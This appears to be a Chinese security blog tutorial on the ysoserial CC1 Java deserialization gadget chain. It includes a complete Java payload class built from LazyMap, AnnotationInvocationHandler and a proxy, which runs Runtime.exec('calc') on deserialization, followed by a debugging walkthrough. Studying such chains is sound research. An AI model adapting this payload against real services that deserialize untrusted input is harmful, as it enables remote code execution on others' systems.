# 漏洞篇 - CC1 链之 ysoserial 版
> 2024-05-12
> 来源：https://changeyourway.github.io/2024/05/12/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC1%E9%93%BEysoserial%E7%89%88/

在前面学习 CC1 链时，我们使用 TransformedMap 作为利用链，但其实除了 TransformedMap 之外，还有 DefaultedMap 和 LazyMap 也可以作为利用链，它们都在 org.apache.commons.collections.map 包下。这一节我们来分析 ysoserial 工具中利用的 CC1 链，它是将 LazyMap 作为利用链的。

## CC1 链之 ysoserial 版

### 环境

-   JDK = 8u65
-   commons-collections = 3.2.1

在前面学习 CC1 链时，我们使用 TransformedMap 作为利用链，但其实除了 TransformedMap 之外，还有 DefaultedMap 和 LazyMap 也可以作为利用链，它们都在 org.apache.commons.collections.map 包下：

![](https://changeyourway.github.io/images/image-20240512110643357.png)

这一节我们来分析 ysoserial 工具中利用的 CC1 链，它是将 LazyMap 作为利用链的。

前面我们利用 TransformedMap 类的 checkSetValue 方法来调用 transform 方法：

```
protected Object checkSetValue(Object value) {
    return this.valueTransformer.transform(value);
}
```

那么回到这一步，还有谁调用了 transform 方法呢？LazyMap 中其实有相关的调用。

### 利用链之 LazyMap 类

LazyMap 的 get 方法中调用了 factory 的 transform 方法：

```
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

factory 是 LazyMap 中定义的属性：

```
protected final Transformer factory;
```

它在构造方法中被赋值：

```
protected LazyMap(Map map, Transformer factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }
    this.factory = factory;
}
```

所以我们让这里的 factory 变成 ChainedTransformer 对象就行。

然而 LazyMap 的构造方法被 protected 修饰，不能直接调用，所以我们需要找哪个方法调用了 LazyMap 的构造方法。

LazyMap 的 decorate 方法中调用了 LazyMap 的构造方法：

```
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}
```

所以我们可以通过这个方法来给 factory 赋值。

接下来就是找哪里调用了 LazyMap 的 get 方法了，AnnotationInvocationHandler 的 invoke 方法有相关的调用。

### AnnotationInvocationHandler 入口类

#### AnnotationInvocationHandler 的 invoke 方法：

```
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();
    Class<?>[] paramTypes = method.getParameterTypes();

    // Handle Object and Annotation methods
    if (member.equals("equals") && paramTypes.length == 1 &&
        paramTypes[0] == Object.class)
        return equalsImpl(args[0]);
    if (paramTypes.length != 0)
        throw new AssertionError("Too many parameters for an annotation method");

    switch(member) {
    case "toString":
        return toStringImpl();
    case "hashCode":
        return hashCodeImpl();
    case "annotationType":
        return type;
    }

    // Handle annotation member accessors
    Object result = memberValues.get(member);

    if (result == null)
        throw new IncompleteAnnotationException(type, member);

    if (result instanceof ExceptionProxy)
        throw ((ExceptionProxy) result).generateException();

    if (result.getClass().isArray() && Array.getLength(result) != 0)
        result = cloneArray(result);

    return result;
}
```

它调用了 memberValues 的 get 方法：

```
// Handle annotation member accessors
Object result = memberValues.get(member);
```

memberValues 是 AnnotationInvocationHandler 类的属性：

```
private final Map<String, Object> memberValues;
```

它在构造方法中被赋值：

```
AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
    Class<?>[] superInterfaces = type.getInterfaces();
    if (!type.isAnnotation() ||
        superInterfaces.length != 1 ||
        superInterfaces[0] != java.lang.annotation.Annotation.class)
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    this.type = type;
    this.memberValues = memberValues;
}
```

这里可以依照前面的办法：利用反射调用 AnnotationInvocationHandler 的构造方法，将 memberValues 赋值成 LazyMap 对象。

那么又要如何调用 AnnotationInvocationHandler 的 invoke 方法呢？

AnnotationInvocationHandler 其实是一个代理类，它继承了 InvocationHandler 类，并重写了 invoke 方法。而我们知道，在调用代理对象的方法时，InvocationHandler 类的 invoke 方法将会被触发。（这方面与 Java 动态代理有关，可以去看我先前的文章）

假使我用 AnnotationInvocationHandler 来构建一个代理对象，那么只要这个代理对象的任意方法被调用，就会调用 AnnotationInvocationHandler 的 invoke 方法了。

那么为了能够反序列化利用，我们还是要回到 readObject 方法。

#### AnnotationInvocationHandler 的 readObject 方法：

```
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                            annotationType.members().get(name)));
            }
        }
    }
}
```

沿用前辈们的思路，我们将触发点选为 memberValues.entrySet() ，只需要将 memberValues 设置成用 AnnotationInvocationHandler 构建的代理对象，那么在调用这个代理对象的任意方法时，都会调用 AnnotationInvocationHandler 的 invoke 方法。

这听起来似乎很矛盾，前面说 memberValues 要赋值成 LazyMap 对象，怎么这里又说 memberValues 要设置成用 AnnotationInvocationHandler 构建的代理对象呢？后面会给出解答。

### 构造 payload

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class FinalPayload {
    public static void main(String[] args) throws Exception {
        // 获取包含执行类的 ChainedTransformer 对象
        Transformer[] transformers = new Transformer[]{
                // 将传入参数固定为 Runtime.class
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer
                        ("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer
                        ("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer
                        ("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 新建一个 Map 对象，无关紧要，只是作为参数传入
        Map<Object, Object> hashMap = new HashMap<>();

        // 初始化利用链 LazyMap
        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);

        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性
        
        // 获取 AnnotationInvocationHandler 的构造器对象
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        
        // 因为不经过判断，第一个参数只要是注解类就行，第二个参数传入 Lazymap 对象作为 memberValues 的值
        Object annotationInvocationHandler1 = constructor.newInstance(Override.class, lazymap);

        // 现在我已经通过构造方法获取了一个 AnnotationInvocationHandler 对象
        // 接下来将这个对象强转成 InvocationHandler 类型，然后用它来获取代理对象
        InvocationHandler invocationHandler = (InvocationHandler) annotationInvocationHandler1;

        // 为了之后能将代理对象作为参数传入 AnnotationInvocationHandler 的构造方法
        // 这里选择创建一个 Map 类型的代理对象
        Map mapProxy = (Map) Proxy.newProxyInstance(
                // 第一个参数是构造器
                Map.class.getClassLoader(),
                // 第二个参数指明代理对象继承的接口
                new Class[]{Map.class},
                // 第三个参数需要一个重写了 invoke 方法的 InvocationHandler 对象
                // 这个对象的 invoke 方法将会在代理对象的任意方法被调用时调用
                invocationHandler
        );

        // 传入 mapProxy 代理对象作为 memberValues 的值
        Object annotationInvocationHandler2 = constructor.newInstance(Override.class, mapProxy);

        // serialize(annotationInvocationHandler2);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

看完 payload 想必就能理解了，我们将代理对象作为 AnnotationInvocationHandler 对象 annotationInvocationHandler2 的 memberValues 属性值，在反序列化时，调用 annotationInvocationHandler2 的 readObject 方法，进而调用 memberValues 的 entrySet() 方法（即代理对象的 entrySet() 方法），此时将会调用代理对象对应的 invoke 方法，这个 invoke 方法正是 annotationInvocationHandler1 的 invoke 方法，annotationInvocationHandler1 的 invoke 方法会调用 memberValues 的 get 方法，而 annotationInvocationHandler1 的 memberValues 属性已经被赋值成 LazyMap 对象了，于是这里调用的是 LazyMap 对象的 get 方法。

我再画个流程图来帮助理解：

```
annotationInvocationHandler2 :: readObject() ->

annotationInvocationHandler2.memberValues :: entrySet()（annotationInvocationHandler2.memberValues = mapProxy）->

annotationInvocationHandler1 :: invoke()（annotationInvocationHandler1.memberValues = lazymap）->

lazymap :: get() -> 

......
```

想必应该能理解了。

### 调试

调试既是为了验证理论的正确性，又是为了加深理解，还可以发现未知的细节。

先执行序列化方法，生成文件之后，对反序列化方法做调试。

主程序 readObject 处下断点：

![](https://changeyourway.github.io/images/image-20240512161824902.png)

AnnotationInvocationHandler.java 的 readObject 方法中的 memberValues.entrySet() 处下断点：

![](https://changeyourway.github.io/images/image-20240512160558799.png)

AnnotationInvocationHandler.java 的 invoke 方法中的 memberValues.get 处下断点：

![](https://changeyourway.github.io/images/image-20240512160653773.png)

开始调试：

![](https://changeyourway.github.io/images/image-20240512162118714.png)

单步进入：进入了 AbstractMapDecorator 类，过程省略。

接着单步进入，此时来到了 LazyMap 的 readObject 方法：

![](https://changeyourway.github.io/images/image-20240512162257878.png)

执行完 LazyMap 的 readObject 方法以后就来到了 AnnotationInvocationHandler 的 invoke 方法：

![](https://changeyourway.github.io/images/image-20240512162547906.png)

调用堆栈也出现了很多调用，细看之下，又跟我们的利用链毫无关系。至于这里为什么会提前调用 invoke 方法，容后再议。

继续调试，经过断点 memberValues.entrySet() ：

![](https://changeyourway.github.io/images/image-20240512163445617.png)

继续调试，不断单步进入又跳出，执行完之后会发现弹出了计算器，而且是三个：

![](https://changeyourway.github.io/images/image-20240512170907564.png)

调试发现中间调用了一大堆乱七八糟的类，实在没有耐心看了，就引用 yhy 师傅的一个比较有说服力的结论吧：

IDEA 在 debug 时，当 debug 到某个对象的时候，会调用对象的 toString() 方法，用来在 debug 界面显示对象信息。弹出多个计算器，多半是由于代理对象的 toString() 方法被私自调用了，触发了 invoke 方法，造成非预期的命令执行。

我们可以在 IDEA 中关闭 Debug 自动调用 toString() 方法：

![](https://changeyourway.github.io/images/image-20240512165453774.png)

至于为什么关闭这个设置后调试仍然弹出了三个计算器，我就不得而知了。

那么，接下来才是重头戏。我们重新设置断点，重新调试。

### 反序列化是由内向外的

在 AnnotationInvocationHandler 类的 readObject 方法中新增一处断点，这一断点是在上一次调试中发现的转折点：

![](https://changeyourway.github.io/images/image-20240512170719041.png)

其余断点不变，开始调试：

![](https://changeyourway.github.io/images/image-20240512171015189.png)

单步进入几次：

![](https://changeyourway.github.io/images/image-20240512171047443.png)

现在调用的是 LazyMap 的 readObject ，说明 LazyMap 相比其他对象是最先被反序列化的。

继续单步进入：

![](https://changeyourway.github.io/images/image-20240512171344943.png)

跳出 LazyMap 的 readObject 方法之后，我们就来到了 AnnotationInvocationHandler 的 readObject 方法，观察 this.memberValues 值，发现它是一个 LazyMap 对象，这说明什么？说明此时反序列化的这个 AnnotationInvocationHandler 对象是 mapProxy 代理对象在创建时作为参数传入的 AnnotationInvocationHandler 对象，而不是最外部的 AnnotationInvocationHandler 对象。

即此时反序列化的是 annotationInvocationHandler1 对象。

接下来单步进入会进入 AnnotationType 类的 getInstance 方法，这个方法又会调用 AnnotationType 的构造方法，在构造方法中我们发现行进到这一步时：

![](https://changeyourway.github.io/images/image-20240512174213941.png)

这里的 ret 已然是一个代理对象，调用 ret.value() 将会进入某个代理类的 invoke 方法。

再下一步就来到了 AnnotationInvocationHandler 对象的 invoke 方法：

![](https://changeyourway.github.io/images/image-20240512172104085.png)

这就是我们之前遇到的 invoke 方法被提前调用的问题。观察下面的 memberValues 属性值可以发现，此时执行 invoke 方法的 AnnotationInvocationHandler 对象并不是 annotationInvocationHandler1 ，因此这一步调用 invoke 并不会造成命令执行，事实也正是如此。

想必这里调用 AnnotationInvocationHandler 的 invoke 方法是 AnnotationType 类的内部逻辑，至于 ret 是如何成为由 AnnotationInvocationHandler 构建的代理对象的，我就不深究了。

继续调试，执行完这一步后，我们回到 annotationInvocationHandler1 的 readObject 方法：

![](https://changeyourway.github.io/images/image-20240512174853686.png)

直接跳到下个断点吧：

![](https://changeyourway.github.io/images/image-20240512174958974.png)

继续调试，当执行完这一步时，我们又来到了 AnnotationInvocationHandler 类的这个断点处：

![](https://changeyourway.github.io/images/image-20240512175126308.png)

并且弹出了三个计算器，说明命令执行在上一步已经完成了，至于这个 AnnotationInvocationHandler 对象，看看它的 memberValues 属性值会发现是一个代理对象，也就是说我们现在正在执行外部的 AnnotationInvocationHandler 对象也即 annotationInvocationHandler2 的 readObject 方法，这一步的 readObject 方法并不会造成命令执行，事实也正是如此，后面的就不用看了，至此，调试完毕。

通过调试，我们可以发现：**反序列化是由内向外的**。而我们之前所预测的调用链被推翻，接下来我会记录下真正的调用链。

### 重新书写调用链

```
反序列化 -> 

lazyMap :: readObject() ->

annotationInvocationHandler1 :: readObject() ->

		AnnotationType :: getInstance() ->

		AnnotationType :: AnnotationType() ->

		AnnotationInvocationHandler :: invoke() （提前调用 invoke ，但不会命令执行）->

annotationInvocationHandler1.memberValues :: entrySet() ->

annotationInvocationHandler1 :: invoke() ->

annotationInvocationHandler1.memberValues :: get() （即 lazyMap :: get()，造成命令执行）->

annotationInvocationHandler2 :: readObject() ->

结束
```

### 结语

真理的相对性也是真理之一，实践是检验真理的唯一标准。
